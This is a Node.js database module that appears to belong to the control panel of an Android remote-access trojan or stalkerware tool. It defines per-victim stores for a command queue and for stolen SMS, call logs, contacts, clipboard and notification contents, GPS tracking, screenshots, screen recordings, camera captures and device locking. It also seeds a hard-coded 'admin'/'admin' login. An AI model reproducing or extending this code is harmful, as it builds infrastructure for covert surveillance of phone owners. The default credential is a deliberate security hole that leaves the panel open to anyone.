const
    lowdb = require('lowdb'),
    FileSync = require('lowdb/adapters/FileSync'),
    path = require('path'),
    adapter = new FileSync('./maindb.json'),
    db = lowdb(adapter);

// Set default admin username and password
db.defaults({
    admin: {
        username: 'admin',
        password: 'admin', // ✅ Updated here
        loginToken: '',
        logs: [],
        ipLog: []
    },
    clients: []
}).write()

// Client database class
class clientdb {
    constructor(clientID) {
        let cdb = lowdb(new FileSync('./clientData/' + clientID + '.json'))
        cdb.defaults({
            clientID,
            CommandQue: [],
            SMSData: [],
            CallData: [],
            contacts: [],
            wifiNow: [],
            wifiLog: [],
            clipboardLog: [],
            notificationLog: [],
            enabledPermissions: [],
            apps: [],
            GPSData: [],
            GPSSettings: {
                updateFrequency: 0
            },
            downloads: [],
            currentFolder: [],
            lockDevice: [],
            screenShot: [],
            screenRecord: [],
            rearCam: [],
            frontCam: []
        }).write()
        return cdb;
    }
}

module.exports = {
    maindb: db,
    clientdb: clientdb,
};
